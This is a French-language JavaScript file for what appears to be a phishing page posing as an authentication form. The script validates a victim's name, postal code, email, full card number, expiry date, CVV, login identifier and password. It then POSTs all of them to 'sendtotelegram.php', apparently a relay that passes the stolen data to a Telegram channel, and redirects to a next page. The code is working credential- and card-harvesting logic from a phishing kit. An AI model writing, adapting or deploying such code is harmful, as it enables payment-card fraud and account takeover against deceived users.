document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('authentification-form');
    const continueButton = document.querySelector('.bouton-continuer');

    continueButton.addEventListener('click', function(event) {
        event.preventDefault(); // Empêcher la navigation par défaut du lien

        let isValid = true;
        const errors = {};

        // Validation du nom
        const nom = document.getElementById('nom').value.trim();
        if (nom === '') {
            errors.nom = 'Nom requis';
            isValid = false;
        }

        // Validation du prénom
        const prenom = document.getElementById('prenom').value.trim();
        if (prenom === '') {
            errors.prenom = 'Prénom requis';
            isValid = false;
        }

        // Validation du code postal (exemple : 5 chiffres)
        const codePostal = document.getElementById('code-postal').value;
        if (!/^\d{5}$/.test(codePostal)) {
            errors.codePostal = 'Code postal invalide';
            isValid = false;
        }

        // Validation de l'email (exemple basique)
        const email = document.getElementById('email').value;
        if (!/\S+@\S+\.\S+/.test(email)) {
            errors.email = 'Email invalide';
            isValid = false;
        }

        // Validation du numéro de carte
        const carteNumeroInputs = document.querySelectorAll('input[name="carte-numero[]"]');
        let carteNumero = '';
        carteNumeroInputs.forEach(input => {
            carteNumero += input.value;
        });
        if (carteNumero.length !== 16 || !/^\d+$/.test(carteNumero)) {
            errors.carteNumero = 'Numéro de carte invalide';
            isValid = false;
        }

        // Validation de l'expiration
        const expirationInputs = document.querySelectorAll('input[name="expiration[]"]');
        let expiration = '';
        expirationInputs.forEach(input => {
            expiration += input.value;
        });
        if (expiration.length !== 4 || !/^\d+$/.test(expiration)) {
            errors.expiration = 'Date d\'expiration invalide';
            isValid = false;
        }

        // Validation du CVV
        const cvv = document.getElementById('cvv').value;
        if (!/^\d{3}$/.test(cvv)) {
            errors.cvv = 'CVV invalide';
            isValid = false;
        }

        // Validation de l'identifiant
        const identifiant = document.getElementById('identifiant').value.trim();
        if (identifiant === '') {
            errors.identifiant = 'Identifiant requis';
            isValid = false;
        }

        // Validation du mot de passe
        const motDePasse = document.getElementById('mot-de-passe').value.trim();
        if (motDePasse === '') {
            errors.motDePasse = 'Mot de passe requis';
            isValid = false;
        }

        // Afficher les erreurs (vous pouvez adapter cette partie pour afficher les erreurs dans votre interface)
        if (!isValid) {
            console.log('Erreurs de validation:', errors); // Affiche les erreurs dans la console
            // Vous pouvez ajouter du code ici pour afficher les erreurs dans des éléments HTML spécifiques
            return; // Arrêter l'exécution si les données ne sont pas valides
        }

        // Si la validation réussit, envoyer les données via fetch
        const formData = new FormData(form);
        fetch('sendtotelegram.php', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (response.ok) {
                window.location.href = 'page4.html';
            } else {
                console.error('Erreur lors de l\'envoi des données');
            }
        })
        .catch(error => {
            console.error('Erreur réseau:', error);
        });
    });
});